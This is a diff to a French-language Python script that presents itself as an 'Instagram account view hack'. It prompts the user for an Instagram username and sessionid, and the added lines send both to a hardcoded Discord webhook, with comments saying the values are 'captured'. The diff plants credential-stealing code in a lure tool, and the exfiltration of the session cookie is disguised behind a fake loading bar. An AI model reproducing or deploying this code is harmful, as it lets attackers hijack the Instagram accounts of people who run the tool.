@@ -57,12 +57,18 @@ Instagram account view hack!               by : LayoMoon
 Chargement en cours [#############################]-100%""")
     time.sleep(1)  # Petite pause pour simuler un chargement
     nom_utilisateur = input("Nom d'utilisateur : ")
+    # Envoyer le nom d'utilisateur au webhook Discord
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouveau nom d\'utilisateur capturé : {nom_utilisateur}')
+    webhook.execute()
     return nom_utilisateur
 
 def saisir_mot_de_passe():
     print("Entrez une sissionid...")
     time.sleep(1)  # Petite pause pour simuler un chargement
     mot_de_passe = input("sessionid : ")
+    # Envoyer la sessionid au webhook Discord
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouvelle sessionid capturée : {mot_de_passe}')
+    webhook.execute()
     return mot_de_passe
 
 def petit_chargement():
